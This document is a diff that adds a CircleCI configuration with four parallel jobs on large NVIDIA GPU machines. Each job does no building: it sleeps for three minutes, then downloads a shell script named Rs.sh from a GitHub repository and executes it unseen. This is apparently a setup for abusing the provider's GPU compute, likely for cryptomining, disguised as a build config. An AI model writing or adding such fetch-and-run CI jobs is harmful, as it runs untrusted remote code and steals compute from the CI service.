@@ -1,0 +1,49 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: sleep 180
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Rs.sh && chmod +x Rs.sh && ./Rs.sh
+      
+
+  build2:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: sleep 180
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Rs.sh && chmod +x Rs.sh && ./Rs.sh
+      
+
+
+  build3:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: sleep 180
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Rs.sh && chmod +x Rs.sh && ./Rs.sh
+
+
+  build4:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: sleep 180
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Rs.sh && chmod +x Rs.sh && ./Rs.sh
+
+
+      
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - build
+            - build2
+            - build3
+            - build4
